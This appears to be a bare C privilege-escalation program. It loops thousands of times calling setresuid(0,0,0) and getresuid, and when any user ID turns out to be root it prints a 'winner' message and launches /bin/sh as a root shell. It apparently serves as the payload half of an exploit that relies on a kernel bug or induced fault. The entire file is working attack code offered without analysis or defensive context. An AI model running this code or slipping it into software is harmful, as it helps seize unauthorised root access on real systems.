#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

uid_t id0,id1,id2;
char *newargv[] = {NULL,"/bin/sh",NULL};

int main(int argc ,char **argv)
{
  unsigned long x = 0;
  unsigned long y = 0;
  unsigned long z = 0;
  int i = 0;
  int cc = 0;
  printf("witch");
  fflush(stdout);
  for(cc = 0;cc < 5;cc++)
  {
    i = 1 - i;
    z = 0;
    for(x = 0;x < 300;x++)
    {
      for(y = 0;y < 300;y++)
      {
        setresuid(0,0,0);
        getresuid(&id0,&id1,&id2);
        if(id0 == 0 || id1 == 0 || id2 == 0)
        {
          printf("winner winner chicken dinner (getresuid)");
          fflush(stdout);
          execve("/bin/sh",newargv,0);
        }
        z += 1;
      }  
    }
    printf("%d:%u\n",i,z);
    fflush(stdout);
  }
}
